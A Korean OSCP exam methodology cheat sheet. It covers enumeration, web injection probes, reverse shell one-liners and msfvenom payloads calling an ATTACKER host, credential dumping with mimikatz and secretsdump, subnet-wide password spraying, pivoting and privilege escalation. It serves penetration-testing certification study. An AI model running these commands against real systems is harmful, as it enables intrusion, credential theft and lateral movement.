---
title: "OSCP 방법론 총정리 (Methodology)"
date: 2026-06-20
weight: 10
draft: false
tags: ["oscp", "cheatsheet"]
summary: "시험 당일 처음부터 끝까지 흐름을 따라가는 마스터 체크리스트."
---

시험 당일 처음부터 끝까지 흐름을 따라가는 마스터 체크리스트.

- 출처: https://heretek.dev/oscp-cheatsheet/methodology/ (Jean Romero) — 재구성
- 변수: `$TARGET` = 공격 대상, `$KALI` = 공격자(Kali) IP

## 멘토 조언 — 패스워드에 ! 이 있으면 반드시 이스케이프

```bash
# " ! " 가 들어간 패스워드는 반드시 \! 로 이스케이프한다.
# ' ' 로 감싸도 ! 가 명령 실행에서 제대로 읽히지 않는다.

nxc smb 10.10.10.10 -u offsec -p "Password1\!"
# 'Password1!' 는 제대로 동작하지 않는다.
```

## 막혔을 때 긴급 대응표 (Emergency Quick-Reference)

- 30분 동안 foothold 실패 → nmap 출력 다시 읽기. 모든 버전 검색. 기본 계정 시도. UDP 확인. API에 POST 시도. 페이지 소스의 숨겨진 경로·주석 확인.
- 쉘은 있지만 privesc 막힘 → `dir C:\` / `Get-ChildItem C:\` / `ls /` 로 이상한 디렉터리 찾기. `netstat -ano` / `ss -tulnp` 로 localhost 서비스 확인. 홈 디렉터리 모든 파일 읽기. 보호된 파일 크랙. pspy64 실행(Linux). PS 히스토리 확인(Windows).
- AD — 초기 creds 후 막힘 → 트랜스크립트 grep이 최우선: `smbclient //IP/share -c 'recurse ON'` 후 `ls` → `_.ps1/*.txt/*.log`에서 ConvertTo-SecureString, PSCredential grep. 비기본 SMB 공유 전부 읽기. 그다음 BloodHound, Kerberoast/AS-REP, creds 스프레이, ADCS, delegation.
- 익스플로잇이 안 됨 → 아키텍처 확인(32/64비트). 코드 읽기. 하드코딩된 IP/포트/경로 수정. 크로스컴파일 시도. bad character 확인. msfvenom exe 대신 nc.exe 패턴 시도.
- 넘어가야 할 때 → 한 박스에서 2시간 이상 붙잡고 있지 않는다. 잠깐 쉬고 새로운 시선으로 복귀. 70점이면 통과 — standalone 하나는 건너뛸 수 있다.

## PHASE 0 — 시험 셋업 (첫 10분)

```bash
export ip=<TARGET_IP>
script -a /home/kali/oscp/exam_log_$(date +%F).txt

# 도구 HTTP 서버를 지금 바로 시작 — 별도 터미널 탭에서
# (작업 디렉터리가 바뀌지 않게)
python3 -m http.server 80 -d ~/Tools &
# ~/Tools 에 준비: linpeas.sh, winpeas.exe, chisel, chisel.exe,
#   nc.exe, SharpHound.exe, PowerView.ps1, pspy64, GodPotato.exe, PrintSpoofer64.exe

# AD 세트 — DNS 및 시간 동기화
sudo ntpdate <DC_IP>
# nmap에서 나온 모든 이름(FQDN + 도메인 + 호스트명)을 한 줄로 /etc/hosts 추가
echo "<DC_IP> dc.domain.local domain.local dc" | sudo tee -a /etc/hosts
# resolv.conf: 인터넷용 8.8.8.8 유지. DC는 /etc/hosts 에만.
echo "nameserver 8.8.8.8" | sudo tee /etc/resolv.conf
```

통과 조합 (70점 통과):

- AD full(40) + standalone full(20) + standalone initial(10) = 70 통과
- AD partial(30) + standalone full(40) x 2 = 70 통과
- AD full(40) + standalone full(40) x 2 = 80 여유

AD는 부분 점수 있음: 워크스테이션 플래그 10점, DC 20점.

시간 배분:

- 0–1시간: 전 머신 스캔. 스캔 병렬 실행. 결과 읽기. 공격 순서 계획.
- 1–5시간: AD 세트(40점). BloodHound → Kerberoast → lateral movement → DC.
- 5–9시간: standalone 1, 2.
- 9–11시간: standalone 3 또는 막힌 박스 재도전.
- 11–12시간: 접근이 살아있을 때 스크린샷 + 리포트 노트 시작.
- 12–16시간: 계속 익스플로잇. 막힌 박스 사이 로테이션.
- 16시간 이후: 정리. 스크린샷 전부 확보 확인. proof 플래그 전부 검증.

전략: AD 세트를 먼저(40점, 가장 효율적). 한 박스에 2시간 이상 X. 발견한 모든 creds → 즉시 전체 스프레이.

리포트 메모: proof 플래그 스크린샷은 `whoami; hostname; ip a; cat proof.txt` (Linux) 또는 `whoami; hostname; ipconfig; type C:\Users\Administrator\Desktop\proof.txt` (Windows — `&&` 대신 세미콜론). 모든 단계를 기록 — 리포트가 pass/fail을 결정. 스크린샷은 나중이 아니라 진행 중에 찍는다.

## PHASE 1 — Enumeration

### 1a. 포트 스캔 (3개 동시 실행)

```bash
# 터미널 1: 빠른 전체 TCP 스캔
sudo nmap -Pn -p- --min-rate=1000 -T4 -oN fast_tcp.txt $ip

# 터미널 2: 상위 20 UDP
sudo nmap -Pn -sU --top-ports=20 -oN udp_top20.txt $ip

# 터미널 3: 정밀 스캔 (fast 스캔 끝난 후)
ports=$(grep '^[0-9]' fast_tcp.txt | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//')
sudo nmap -A -Pn -sC -sV -p $ports -oA targeted $ip

# 취약점 스캔 (수동 열거하는 동안 실행)
sudo nmap -sV -p $ports --script "vuln" $ip -oN vuln.txt
```

### 1b. 포트별 명령

열린 포트 전부 순서대로 처리. `빈출` 표시 = 가장 흔한 foothold 벡터.

- 빈출 / 21 FTP: `ftp $ip` (anonymous:anonymous). 쓰기 가능 + 웹 루트 겹침 → 웹셸 업로드
- 22 SSH: 버전 기록. 사용자명 확실할 때만 브루트포스. 키 발견 시 `ssh2john`
- 53 DNS: `dig AXFR @$ip <domain>`, `dnsrecon -d <domain> -n $ip -t std`
- 빈출 / 80·443 HTTP: 아래 PHASE 2 Web으로
- 88 Kerberos: `kerbrute userenum -d DOMAIN --dc $ip users.txt`
- 110·143 POP/IMAP: `telnet $ip 110` — USER/PASS/LIST/RETR
- 빈출 / 111·2049 NFS: `showmount -e $ip`, 마운트 후 no_root_squash 확인
- 135 MSRPC: `rpcclient -U "" -N $ip -c 'enumdomusers; netshareenumall'`
- 빈출 / 139·445 SMB: `enum4linux-ng -A $ip`, `smbclient -L //$ip -N`, `smbmap -H $ip`, `nmap --script smb-vuln* -p 445 $ip`. 전부 다운로드: `smbclient //$ip/share -N -c 'recurse;prompt;mget *'`
- 빈출 / 161 SNMP: `onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $ip` → `snmpwalk -c <string> -v2c $ip`. Windows OID — users `1.3.6.1.4.1.77.1.2.25`, processes `1.3.6.1.2.1.25.4.2.1.2`, software `1.3.6.1.2.1.25.6.3.1.2`, TCP ports `1.3.6.1.2.1.6.13.1.3`
- 빈출 / 389·636 LDAP: `ldapsearch -x -H ldap://$ip -s base namingcontexts` → creds로 열거
- 빈출 / 1433 MSSQL: `impacket-mssqlclient sa:password@$ip`, xp_cmdshell 시도
- 3306 MySQL: `mysql -h $ip -u root`, 패스워드 없이 시도. evil-winrm 로컬: `.\\mysql.exe -u root -e "SHOW DATABASES;"` (`-e` 로 hanging 방지)
- 5432 Postgres: `psql -h $ip -U postgres`, `COPY TO PROGRAM` 시도
- 빈출 / 5985·5986 WinRM: `evil-winrm -i $ip -u user -p pass` (5986 = SSL, `-S` 추가)
- 6379 Redis: `redis-cli -h $ip` — CONFIG GET dir, 웹셸 쓰기
- 3389 RDP: `xfreerdp /u:user /p:pass /v:$ip /cert:ignore +clipboard`
- 빈출 / 8080·8443 대체 웹: 80/443과 동일. Tomcat(`/manager`에서 `tomcat:s3cret`), Jenkins(script console → Groovy shell), WebLogic 확인

```bash
curl http://$ip:PORT/endpoint                # GET
curl -d "" -X POST http://$ip:PORT/endpoint  # POST (content-length 추가)
```

## PHASE 2 — Web Attacks

### Step 1 — 정찰 (병렬 실행)

```bash
feroxbuster -u http://$ip -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,asp,aspx,jsp,bak -C 404 -t 50
gobuster dir -u http://$ip -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -t 50

# cgi-bin 확인 (Shellshock!)
gobuster dir -u http://$ip/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x sh,pl,cgi -t 50

# 가상 호스트 (도메인명 알 때)
ffuf -u http://$ip/ -H "Host: FUZZ.<domain>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <default_size>

# Nikto (백그라운드 — 느리지만 뭔가 찾아냄)
nikto -h http://$ip -o nikto.txt &
```

수동으로 항상 확인: `robots.txt`, `sitemap.xml`, `.git/HEAD`, `web.config`, `.env`, 페이지 소스(주석, JS 파일, hidden 필드, 버전 번호)

### Step 2 — CMS?

```bash
wpscan --url http://$ip --enumerate p --plugins-detection aggressive  # WordPress
droopescan scan drupal -u http://$ip      # Drupal
```

발견된 CMS는 → `searchsploit <CMS> <version>`

### Step 3 — 기본 계정

모든 로그인에 시도: `admin:admin`, `admin:password`, `admin:Password1`, `root:root`, `tomcat:s3cret`

### Step 4 — 파라미터 테스트

발견한 모든 입력/파라미터에:

- SQLi: `'`, `' OR 1=1-- -`, time-based `1' WAITFOR DELAY '0:0:5'-- -`
- XSS: `<script>alert(1)</script>`, `"><img src=x onerror=alert(1)>`
- LFI: `../../../../etc/passwd`, `php://filter/convert.base64-encode/resource=index`
- Command injection: `; id`, `| id`, `$(id)`, 백틱
- SSTI: `${7*7}`, `{{7*7}}`, `<%= 7*7 %>` — `49` 로 렌더되면 주입 가능

### Step 5 — 파일 업로드?

업로드 폼 발견 시:

- 스택에 맞는 웹셸 업로드 (`.php`, `.aspx`, `.jsp`)
- 확장자 필터 우회: 이중 확장자(`shell.php.jpg`), 대소문자 혼용(`.pHp`), 대체 확장자(`.phtml`, `.php5`, `.phar`)
- Content-Type 검사 우회: Burp에서 `Content-Type: image/png` 설정, 본문은 악성 그대로
- 이미지 검증 통과: 유효한 매직 헤더 프리펜드(예: `GIF89a;`)
- 저장 위치 확인(`/uploads/`, `/files/`) → 브라우징해서 실행

## PHASE 3 — Foothold

1. 알려진 익스플로잇 — 버전 일치하는 `searchsploit` 결과? 코드 읽고 수정하고 실행
2. 기본/취약 creds — 모든 로그인, DB, 관리 인터페이스에 시도했는가?
3. 웹 익스플로잇 — Phase 2에서 SQLi, LFI, 업로드, 커맨드 인젝션 찾았는가?
4. creds 재사용 — 어디서든 찾은 creds → SSH, WinRM, RDP, SMB 전부 시도
5. 브루트포스(최후 수단) — 사용자명 확실할 때만: `hydra -l user -P rockyou.txt ssh://$ip -t 4`

리버스 쉘 셋업:

```bash
rlwrap nc -lvnp 443    # 443 포트 — 4444는 방화벽에 막히는 경우가 많다
```

```bash
# Bash
bash -c 'bash -i >& /dev/tcp/ATTACKER/443 0>&1'
# Python (Linux)
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
# PowerShell (Windows — 파일 업로드 전에 명령 실행만 가능할 때)
powershell -nop -w hidden -c "$c=New-Object System.Net.Sockets.TCPClient('ATTACKER',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$t=$r+'PS '+(pwd).Path+'> ';$s.Write(([Text.Encoding]::ASCII.GetBytes($t)),0,$t.Length);$s.Flush()};$c.Close()"
# msfvenom — 64비트 먼저
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f elf -o shell.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f exe -o shell.exe
# 32비트 (타깃이 x86일 때 — Linux는 `file`, Windows는 `systeminfo`로 확인)
msfvenom -p linux/x86/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f elf -o shell32.elf
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f exe -o shell32.exe
```

## PHASE 4 — Post-Exploitation (모든 쉘 확보 직후, 매번)

착지한 모든 머신에서 매번 전부 수행. 첫 번째 머신만 하는 게 아니다.

### Step 1 — 쉘 안정화

Linux:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Enter Enter
export TERM=xterm-256color
stty rows 50 cols 200
```

Windows (nc.exe로 받은 raw cmd.exe 쉘):

```powershell
# 타깃에서 cmd → PowerShell 전환:
powershell -ep bypass

# 쉘이 계속 죽으면 — nc.exe로 새 콜백 (Step 2b에서 이미 업로드):
C:\Windows\Temp\nc.exe KALI_IP 443 -e cmd.exe
# Kali의 다른 터미널에서: rlwrap nc -lvnp 443
```

### Step 2 — 식별 + 스크린샷

```text
# Linux                        # Windows
whoami && id                   whoami /all
hostname                       hostname
ip a                           ipconfig /all
```

즉시 스크린샷. 시험 당일에는 나중에 잊는다.

### Step 2b — 타깃으로 도구 업로드

HTTP 파일 서버는 Phase 0에서 이미 실행 중이어야 한다. 아니면: `cd ~/Tools && python3 -m http.server 80 &`

```bash
# Linux 타깃으로 업로드
wget http://KALI/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh
wget http://KALI/chisel -O /tmp/chisel && chmod +x /tmp/chisel
wget http://KALI/pspy64 -O /tmp/pspy64 && chmod +x /tmp/pspy64
```

```powershell
# Windows 타깃으로 업로드
certutil -urlcache -f http://KALI/winpeas.exe C:\Windows\Temp\winpeas.exe
certutil -urlcache -f http://KALI/chisel.exe C:\Windows\Temp\chisel.exe
certutil -urlcache -f http://KALI/nc.exe C:\Windows\Temp\nc.exe
# certutil 막혔을 때 대체:
powershell -c "iwr http://KALI/winpeas.exe -OutFile C:\Windows\Temp\winpeas.exe"
# evil-winrm 경우 (내장 업로드):
upload /home/kali/Tools/winpeas.exe C:\Windows\Temp\winpeas.exe
```

타깃에서 Kali로 파일 다운로드 (winpeas 결과, loot 등):

```text
# 방법 1: evil-winrm 내장
*Evil-WinRM* PS> download C:\Windows\Temp\winpeas.txt .

# 방법 2: Kali에서 SMB 서버 (별도 터미널)
impacket-smbserver smb $(pwd) -smb2support
# 타깃에서: copy C:\Windows\Temp\winpeas.txt \\KALI_IP\smb\winpeas.txt
```

### Step 3 — 플래그 획득

```bash
cat /home/*/local.txt && cat /root/proof.txt 2>/dev/null          # Linux
```

```powershell
Get-ChildItem -Path C:\Users -Recurse -Filter local.txt -ErrorAction SilentlyContinue | Get-Content   # Windows
Get-ChildItem -Path C:\Users -Recurse -Filter proof.txt -ErrorAction SilentlyContinue | Get-Content
```

### Step 4 — 내부 네트워크 + 숨은 서비스 확인

착지한 모든 머신에서 실행:

```text
# LINUX                            # WINDOWS
ip a                               ipconfig /all
ip route                           route print
arp -a                             arp -a
ss -tulnp                          netstat -ano | findstr LISTENING
```

출력을 읽고 세 가지를 확인한다.

### A) NIC이 두 개인가? → 피벗 필요

`ip a`가 `eth0: 192.168.x.x` 와 `eth1: 172.16.x.x` 를 동시에 보여주면, 이 머신은 Kali가 닿지 않는 내부 네트워크를 볼 수 있다. 터널링 필요. Chisel 사용:

```bash
# Kali 터미널 — Chisel 서버 시작
./chisel server -p 9999 --reverse

# Chisel 바이너리는 Step 2b에서 타깃에 이미 있어야 한다.
# 없으면: 80 포트 python3 HTTP 서버에서 다운로드.

# 침투한 머신에서 — 콜백 연결
# Linux:
./chisel client KALI_IP:9999 R:socks
# Windows:
.\chisel.exe client KALI_IP:9999 R:socks

# Kali의 /etc/proxychains4.conf — 마지막 줄 변경:
# socks5 127.0.0.1 1080

# 이제 Kali 도구 전부 터널을 통해 동작:
proxychains -q nmap -sT -Pn -p 80,445,5985,3389 INTERNAL_IP
proxychains -q curl http://INTERNAL_IP
proxychains -q evil-winrm -i INTERNAL_IP -u USER -p PASS
proxychains -q smbclient -L //INTERNAL_IP -U USER
```

터널이 열리면 → PHASE 1로 돌아가 새 서브넷을 열거한다.

### B) 127.0.0.1 에서만 리스닝하는 서비스가 있는가? → 포트 포워드

`netstat -ano`가 `127.0.0.1:8080 LISTENING` 을 보여주면 이 서비스는 이 머신에서만 접근 가능. 그 포트를 Kali로 포워드. Chisel (A와 같은 도구, 문법만 다름):

```bash
# Chisel 서버는 A에서 이미 실행 중이어야 한다. 없으면:
# ./chisel server -p 9999 --reverse

# 타깃에서 — chisel 바이너리는 Step 2b에서 이미 있음.
# TIP: 하나의 클라이언트 연결에 SOCKS + 포트 포워드를 합칠 수 있다:
# ./chisel client KALI_IP:9999 R:socks R:9090:127.0.0.1:8080
# 타깃의 localhost:8080 → Kali의 localhost:9090
.\chisel.exe client KALI_IP:9999 R:9090:127.0.0.1:8080
# Linux: ./chisel client KALI_IP:9999 R:9090:127.0.0.1:8080

# Kali에서 포워드된 서비스 접근
curl http://127.0.0.1:9090
# 또는 브라우저로: http://127.0.0.1:9090
```

- Chisel은 업로드하는 단일 바이너리. 타깃에 SSH나 Socat이 필요 없다.
- 여러 포트 동시 포워드: `R:9090:127.0.0.1:8080 R:9091:127.0.0.1:3306`
- 8080, 9090은 netstat에서 발견한 포트로 바꿔 쓴다.

조사할 가치가 있는 흔한 localhost 서비스: 80/8080(웹 앱), 1433(MSSQL), 3306(MySQL), 5432(Postgres).

터널링 전에 타깃에서 직접 상호작용을 먼저 시도:

```powershell
# MySQL (C:\xampp\mysql\bin 등 mysql.exe 위치에서)
.\mysql.exe -u root --password=""
.\mysql.exe -u root -e "SHOW DATABASES;"
.\mysql.exe -u root -e "USE dbname; SELECT * FROM users;"
# Evil-WinRM은 인터랙티브 프롬프트에서 hang — 항상 -e 플래그

# 알 수 없는 포트의 프로세스 식별 (admin 불필요)
Get-Process -Id <PID> | Select-Object Name,Path
# 모든 포트를 한 번에 매핑:
Get-NetTCPConnection -State Listen | Select-Object LocalAddress,LocalPort,OwningProcess,@{Name='Process';Expression={(Get-Process -Id $_.OwningProcess).Name}} | Sort-Object LocalPort
```

### C) 둘 다 아니면

Step 5로 진행.

### Step 5 — creds 수확 + 파일시스템 loot + creds 표에 추가

```bash
# Linux: bash history, config 파일, env vars, .git 저장소
cat ~/.bash_history
env | grep -i pass
find / -name ".git" -type d 2>/dev/null
grep -ri 'password' /var/www/ /opt/ /home/ 2>/dev/null
```

```powershell
# Windows — CMD와 PS 양쪽에서 동작:
whoami /all
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
netstat -ano | findstr LISTENING

# CMD 전용 (프롬프트가 C:\> 일 때):
type C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type C:\inetpub\wwwroot\web.config 2>nul
type C:\Windows\Panther\unattend.xml 2>nul

# PS 전용 (프롬프트가 PS C:\> 일 때):
Get-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -EA SilentlyContinue
Get-Content C:\inetpub\wwwroot\web.config -EA SilentlyContinue
Get-Content C:\Windows\Panther\unattend.xml -EA SilentlyContinue
Get-ChildItem -Path C:\ -Recurse -Filter *.kdbx -EA SilentlyContinue | Select FullName

# 숨은 AppData — PS 전용 (dir 로는 안 보이고 WinPEAS도 놓친다):
Get-ChildItem -Path C:\Users\*\AppData -Recurse -Include *.xml,*.config,*.ini,*.txt,*.settings -Force -EA SilentlyContinue | Select-String -Pattern "password|credential|passwd" -List | Select Path
# 찾은 것은 읽기: Get-Content "<PATH>" -EA SilentlyContinue
```

```powershell
# Windows: 로컬 DB에서 creds 확인 (Step 4에서 MySQL/MSSQL 발견 시)
.\mysql.exe -u root -e "SHOW DATABASES;"
# 기본 DB가 아닌 것은 전부 덤프:
.\mysql.exe -u root -e "USE creds; SHOW TABLES;"
.\mysql.exe -u root -e "USE creds; SELECT * FROM users;"
.\mysql.exe -u root -e "USE wordpress; SELECT user_login,user_pass FROM wp_users;"
```

발견한 모든 creds → creds 표 갱신 → 즉시 전체 스프레이.

```bash
# 지금까지 찾은 모든 creds로 파일 생성
echo -e "administrator\ncharlotte\njohn" > users.txt
echo -e "Password1\nFound_Pass2" > passes.txt

# 모든 유저 x 모든 패스워드 x 모든 서비스 x 모든 IP 스프레이
nxc smb <SUBNET>/24 -u users.txt -p passes.txt --continue-on-success
nxc winrm <SUBNET>/24 -u users.txt -p passes.txt --continue-on-success
nxc rdp <SUBNET>/24 -u users.txt -p passes.txt --continue-on-success
nxc mssql <SUBNET>/24 -u users.txt -p passes.txt --continue-on-success
```

발견 즉시 모든 서비스에 스프레이하는 이 단일 습관이 체인을 만든다.

### Step 6 — Privesc

→ PHASE 5 (Linux) 또는 PHASE 6 (Windows)

### Step 7 — root/admin 획득 후 (매번 수행)

```bash
# 1. proof 스크린샷 (4개 한 장에 — 건너뛰지 않는다)
# Linux:   whoami && hostname && ip a && cat /root/proof.txt
# Windows: whoami; hostname; ipconfig; type C:\Users\Administrator\Desktop\proof.txt

# 2. creds 전부 덤프 (메모리 + 레지스트리)
# Kali에서: impacket-secretsdump 'DOMAIN/USER:PASS'@TARGET_IP
# Windows:  mimikatz "privilege::debug" "sekurlsa::logonpasswords" "exit"
# Linux:    cat /etc/shadow

# 8항목 체크리스트 실행. mimikatz/secretsdump가 놓치는 creds을 잡는다:
# 해시가 든 로그 파일, 평문 creds이 든 텍스트 파일, SSH 키, 백업 파일, 웹 config

# 4. 내부 네트워크 재확인 (root는 새 인터페이스를 볼 수 있다)
# ip a / ipconfig /all — Step 4 재실행

# 5. 새 creds 즉시 스프레이
nxc smb ALL_IPS -u 'NEW_USER' -p 'NEW_PASS' --continue-on-success
```

## PHASE 5 — Linux Privilege Escalation

순서대로 확인. 처음 3개가 벡터의 약 80%를 잡는다.

1. `sudo -l` → GTFOBins
2. SUID: `find / -perm -u=s -type f 2>/dev/null` → GTFOBins
3. Cron/timers: `cat /etc/crontab && ls -la /etc/cron.d/` + `pspy64` 실행 → 쓰기 가능한 스크립트? PATH hijack?
4. Capabilities: `getcap -r / 2>/dev/null` → cap_setuid면 즉시 root
5. LinPEAS: `./linpeas.sh` 실행 후 출력 검토 → RED/YELLOW 항목 확인
6. 패스워드: `grep -ri 'password' /var/www/ /opt/ /home/` + bash_history → creds 재사용
7. SSH 키: `find / -name id_rsa 2>/dev/null` → 다른 유저로 SSH
8. 쓰기 가능한 /etc/passwd: `ls -la /etc/passwd` → root 유저 추가
9. 내부 서비스: `ss -tulnp` → localhost 전용이면 Chisel 포워드 → PHASE 4 Step 4B
10. NFS no_root_squash: `cat /etc/exports` → 마운트 + SUID bash
11. Docker/LXD 그룹: `id` → 컨테이너 탈출
12. 커널(최후 수단): `uname -a` + linux-exploit-suggester → PwnKit, DirtyPipe

## PHASE 6 — Windows Privilege Escalation

어떤 쉘인지 확인: `C:\>` = CMD, `PS C:\>` = PowerShell. 아래 명령은 표기 없으면 양쪽 동작. 전환: `cmd` 또는 `powershell -ep bypass`.

2. WinPEAS: `.\winpeas.exe cmd | Tee-Object -FilePath .\winpeas.txt` (PS) 또는 `.\winpeas.exe cmd > winpeas.txt` (CMD) → RED/YELLOW 확인
3. 서비스 설정 오류: `wmic service get name,pathname,startmode` → unquoted path 또는 쓰기 가능한 바이너리 → `sc config`
4. 저장된 creds: `cmdkey /list` → 항목 발견 → `runas /savecred`
5. PS 히스토리 — CMD: `type C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` / PS: `Get-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -EA SilentlyContinue` → creds 재사용
6. AlwaysInstallElevated: `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` → msfvenom MSI
7. SAM/SYSTEM 백업 — CMD: `dir C:\Windows\Repair\SAM` / PS: `Get-ChildItem C:\Windows\Repair\SAM -EA SilentlyContinue` → secretsdump
8. 예약 작업: `schtasks /query /fo LIST /v` → 쓰기 가능한 스크립트?
10. DLL hijacking — CMD: `echo %PATH%` / PS: `$env:PATH -split ';'` → PATH의 쓰기 가능 디렉터리 → DLL 심기
11. 내부 서비스: `netstat -ano | findstr LISTENING` → 직접 상호작용 먼저 (MySQL `-e`, curl) → 필요하면 Chisel 터널 → PHASE 4 Step 4B
12. UAC bypass: `whoami /groups` → Medium Mandatory + admin → fodhelper

추가 실행:

- CMD: `findstr /si "password" *.txt *.xml *.ini *.config` (C:\ 이 아니라 유저 홈에서)
- PS: `Get-ChildItem -Recurse -Include *.txt,*.xml,*.ini,*.config -EA SilentlyContinue | Select-String "password" -List | Select Path`
- 공용: `reg query HKLM /f password /t REG_SZ /s`

Potato 공격 빠른 참조:

- Server 2016 이하: JuicyPotato
- Server 2019+ / Win10 1809+: PrintSpoofer
- 범용: GodPotato 또는 SigmaPotato

```powershell
PrintSpoofer.exe -i -c cmd
GodPotato-NET4.exe -cmd "C:\Windows\Temp\nc.exe ATTACKER 443 -e cmd.exe"
```

## WinPEAS / LinPEAS 출력 읽는 법 (전부 읽지 않는다)

PEAS 출력은 수천 줄. 전부 읽지 않고 특정 섹션을 검색한다.

### LinPEAS — 이 순서로 확인

```bash
# 먼저 파일로 저장
./linpeas.sh | tee linpeas.txt
# 그다음 중요한 것 검색:
grep -A5 '\[1\]' linpeas.txt                    # RED/YELLOW 발견 (최우선)
grep -A3 'sudo -l' linpeas.txt                  # sudo 권한
grep -B2 -A2 'SUID' linpeas.txt                 # SUID 바이너리
grep -B2 -A5 'Cron' linpeas.txt                 # cron job
grep -A3 'Capabilities' linpeas.txt             # 파일 capabilities
grep -B2 -A5 'password\|credential' linpeas.txt # 파일 속 패스워드
grep -A3 'writable' linpeas.txt                 # 쓰기 가능 파일/디렉터리
grep -A5 'docker\|lxd' linpeas.txt              # 컨테이너 탈출
grep -A3 '127.0.0.1' linpeas.txt                # localhost 전용 서비스
```

색 가이드: RED/YELLOW = 거의 확실히 악용 가능. RED = 치명적 발견. GREEN = 참고 정보.

### WinPEAS — 이 순서로 확인

```powershell
# 파일로 저장 (색 때문에 터미널에서 판독 불가 — 리다이렉트)
.\winpeas.exe cmd > C:\Windows\Temp\winpeas.txt

# Kali로 다운로드 (SMB 서버 또는 evil-winrm download) 후 검색:
grep -A5 'Password\|credential\|AutoLogon' winpeas.txt
grep -A5 'SeImpersonate\|SeBackup\|SeDebug\|SeRestore' winpeas.txt
grep -A5 'Unquoted\|Modifiable' winpeas.txt      # 서비스 설정 오류
grep -A5 'AlwaysInstallElevated' winpeas.txt
grep -A5 'PSReadLine\|ConsoleHost_history' winpeas.txt
grep -A5 'Unattend\|web.config\|SiteList' winpeas.txt
grep -B2 -A5 '127.0.0.1' winpeas.txt             # localhost 서비스
grep -A3 'Backup Operators\|Server Operators\|DnsAdmins' winpeas.txt
```

단축: `winpeas.exe` 가 아니라 `winpeas.exe cmd` 로 실행 — `cmd` 플래그가 파일 리다이렉트를 깨는 ANSI 색 없는 깔끔한 출력을 준다.

PEAS 출력을 위에서 아래로 30분 읽지 않는다. 위 섹션을 grep하고, RED/YELLOW 확인하고, 다음으로 넘어간다.

## PHASE 7 — Active Directory (Assumed Breach)

### AD 체인 (암기)

```text
1. creds 제공 → BloodHound + netexec 열거 (Playbook Phase 1)
2. Kerberoast + AS-REP roast → crack → spray (Phase 2)
3. BloodHound 확인: ACL 엣지? ADCS? Delegation? (Phase 3-4)
4. admin 획득한 모든 머신 → secretsdump → 새 해시 스프레이 (Phase 5-6)
5. 새 creds마다 2-4 반복
6. DA → DCSync → PtH to DC → proof.txt (Phase 9)
```

### AD 관련 리마인더

- BloodHound 항상 먼저. 공격 전에 수집 + 최단 경로 확인.
- creds 표가 전부. secretsdump, 크랙, config 파일 발견 때마다 갱신. 즉시 스프레이.
- 세션 확인: BloodHound 커스텀 쿼리 `MATCH p=(c:Computer)-[:HasSession]->(m:User) RETURN p` — 고가치 유저가 어디 로그인했는지 알려준다.
- 막히면? BloodHound 쿼리 재실행. 모든 SMB 공유 읽기. ADCS 확인. 새 유저로 Kerberoast 재시도. 모든 패스워드 변형 스프레이.

## 빠른 참조 링크 (같은 폴더 문서)

- 서비스별 열거 → [enumeration.md](enumeration.md)
- 웹 앱 테스트 → [web-attacks.md](web-attacks.md), [sql-injection.md](sql-injection.md)
- 쉘 획득 / 파일 전송 → [shells-and-transfers.md](shells-and-transfers.md)
- Linux privesc → [linux-privilege-escalation.md](linux-privilege-escalation.md)
- Windows privesc → [windows-privilege-escalation.md](windows-privilege-escalation.md)
- Active Directory → [active-directory-playbook.md](active-directory-playbook.md), [active-directory-tools.md](active-directory-tools.md)
- 피벗팅 → [pivoting-and-tunneling.md](pivoting-and-tunneling.md), [ligolo-ng.md](ligolo-ng.md)
- 해시 크랙 → [hash-types.md](hash-types.md), [password-attacks.md](password-attacks.md)
- 버퍼 오버플로 → [buffer-overflows.md](buffer-overflows.md)
- 리포트 작성 → [report-writing.md](report-writing.md)
